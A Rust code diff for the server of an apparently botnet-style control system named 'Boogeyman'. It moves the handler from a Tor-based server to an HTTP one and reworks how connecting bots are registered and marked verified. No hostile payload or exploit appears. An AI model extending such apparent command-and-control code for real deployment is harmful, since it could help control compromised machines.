@@ -1,12 +1,15 @@
-use std::{ collections::HashMap, sync::Arc };
+use std::sync::Arc;
 use chrono::Utc;
 use client_vars::types::send::{ BoogeymanSendPayload, ServerAction, ServerParams };
-use tokio::{ net::TcpStream, sync::{ Mutex, RwLock } };
-use super::{ sanitization::verify_client_init, tor::{ Bot, ClientInstance, TorServerHandler } };
+use tokio::{ net::TcpStream, sync::Mutex };
 use anyhow::Result;
+use crate::server::{
+    http_server::{ Bot, ClientInstance, ServerHandler },
+    sanitization::verify_client_init,
+};
 
 pub async fn route_client(
-    handler: &TorServerHandler,
+    handler: &ServerHandler,
     payload: BoogeymanSendPayload,
     stream_ref: Arc<Mutex<TcpStream>>
 ) -> Result<()> {
@@ -62,7 +65,7 @@ pub async fn route_client(
 }
 
 pub async fn init(
-    handler: &TorServerHandler,
+    handler: &ServerHandler,
     payload: BoogeymanSendPayload,
     stream_ref: Arc<Mutex<TcpStream>>
 ) -> Result<()> {
@@ -70,15 +73,21 @@ pub async fn init(
         verify_client_init(&params)?;
         // first sanitize botstate
         let mut bot_map = handler.bot_map.write().await;
-        let bot = bot_map.entry(payload.id.clone()).or_insert(Bot::new(payload.id));
-
-        bot.client_instances.push(ClientInstance {
-            join_date: Utc::now().to_string(),
+        let client_new_instance = ClientInstance {
+            join_date: Utc::now().to_rfc3339(),
             version: payload.version,
             bot_state: params.bot_state,
             console: String::new(),
-        });
-        drop(bot_map);
+        };
+        if let Some(bot) = bot_map.get_mut(&payload.id) {
+            bot.client_instances.push(client_new_instance);
+            bot.verified = true;
+        } else {
+            bot_map.insert(
+                payload.id.clone(),
+                Bot::new(payload.id.clone(), vec![client_new_instance], vec![], true)
+            );
+        }
         Ok(())
     } else {
         return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
